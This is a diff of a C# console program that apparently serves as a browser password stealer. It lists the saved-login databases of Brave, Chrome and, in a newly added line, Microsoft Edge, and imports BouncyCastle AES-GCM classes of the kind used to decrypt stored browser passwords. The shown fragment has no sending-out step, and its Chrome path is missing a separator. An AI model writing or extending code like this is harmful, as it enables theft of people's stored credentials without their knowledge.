@@ -2,20 +2,13 @@ using System;
 using System.IO;
 using System.Linq;
 using System.Collections.Generic;
-using System.Data.SQLite;
 using System.Text;
-using System.Net;
-using System.Threading.Tasks;
-using System.Windows;
 using System.Security.Cryptography;
-using System.Text.RegularExpressions;
-using System.Net.Http;
 using System.Threading;
 using Org.BouncyCastle.Crypto.Modes;
 using Org.BouncyCastle.Crypto.Engines;
 using Org.BouncyCastle.Crypto.Parameters;
 using Newtonsoft.Json;
-using DocumentFormat.OpenXml.Wordprocessing;
 
 namespace ConsoleApp1
 {
@@ -30,7 +23,9 @@ namespace ConsoleApp1
             string[] paths = {
                
                  Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
-                 Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"Google\Chrome\User Data\default\Login Data"
+                 Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"Google\Chrome\User Data\default\Login Data",
+                 Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"Microsoft\Edge\User Data\Default\Login Data"
+
             };
             string pwd_text = "";
 
